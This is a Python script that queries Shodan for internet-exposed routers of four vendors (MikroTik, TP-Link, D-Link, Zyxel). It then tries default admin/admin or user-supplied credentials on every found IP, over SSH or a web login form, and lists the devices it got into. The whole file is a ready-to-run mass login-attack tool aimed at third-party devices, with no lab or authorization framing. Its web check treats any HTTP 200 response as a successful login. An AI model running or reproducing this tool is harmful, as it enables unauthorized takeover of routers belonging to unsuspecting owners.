import shodan
import paramiko
import requests


SHODAN_API_KEY = input('Enter Shodan API key:')

# Проверка валидности API-ключа
while True:
    if SHODAN_API_KEY.strip() == '':
        print('API key cannot be empty')
        SHODAN_API_KEY = input('Enter Shodan API key: ')
    else:
        try:
            api = shodan.Shodan(SHODAN_API_KEY)
            # Проверяем, что ключ действительный, обращаясь к API
            api.info()
            break
        except shodan.APIError as e:
            print('Error:', e)
            SHODAN_API_KEY = input('Enter Shodan API key: ')


def search_router(query):
    api = shodan.Shodan(SHODAN_API_KEY)
    try:
        results = api.search(query)
    except:
        print('API Key invalid')
    return results['matches']


def ssh_auth(ip, username, password):
    try:
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(ip, port=22, username=username, password=password, timeout=5)
        print(f"Successfully authenticated to {ip} via SSH")
        ssh.close()
        return True
    except:
        return False


def web_auth(ip, username, password):
    try:
        url = f"http://{ip}/login.cgi"
        data = {'username': username, 'password': password}
        response = requests.post(url, data=data, timeout=5)
        if response.status_code == 200 or "success" in response.text:
            print(f"Successfully authenticated to {ip} via web")
            return True
        else:
            return False
    except:
        return False


def choose_auth_type():
    while True:
        auth_type = input("Choose authentication type:\n"
                          "1 - SSH\n"
                          "2 - WEB\n"
                          "Enter number: ")
        if auth_type == "1" or auth_type == "2":
            return auth_type.lower()
        else:
            print("Invalid input, please choose ssh or web")


if __name__ == "__main__":
    print('Choose Router distributor:\n'
          '1 - MikroTik\n'
          '2 - TP-Link\n'
          '3 - D-Link\n'
          '4 - Zyxel')
    model = input('Enter number:')
    if model == '1':
        query = 'router os'
        print('Looking for Mikrotik routers...')
    elif model == '2':
        query = 'TP-Link'
        print(f'Looking for {query} routers...')
    elif model == '3':
        query = 'D-Link'
        print(f'Looking for {query} routers...')
    elif model == '4':
        query = 'Zyxel'
        print(f'Looking for {query} routers...')
    else:
        print('INVALID INPUT')
    login = 'admin'
    password = 'admin'
    results = search_router(query)
    print(f"Found {len(results)} routers")
    auth_type = choose_auth_type()
    print('Enter login credentials:\n'
          '1 - Default (admin/admin)\n'
          '2 - Custom')
    auth_data = input('Enter number:')
    if auth_data == '1':
        login = 'admin'
        password = 'admin'
    elif auth_data == '2':
        login = str(input('Login:'))
        password = str(input('Password:'))
    else:
        print('INVALID INPUT')
    print('Searching...')
    successful_logins = []
    for result in results:
        ip = result['ip_str']
        if auth_type == "1":
            if ssh_auth(ip, login, password):
                successful_logins.append(ip)
        else:
            if web_auth(ip, login, password):
                successful_logins.append(ip)
    print(f"Successfully authenticated to {len(successful_logins)} routers: {successful_logins}")
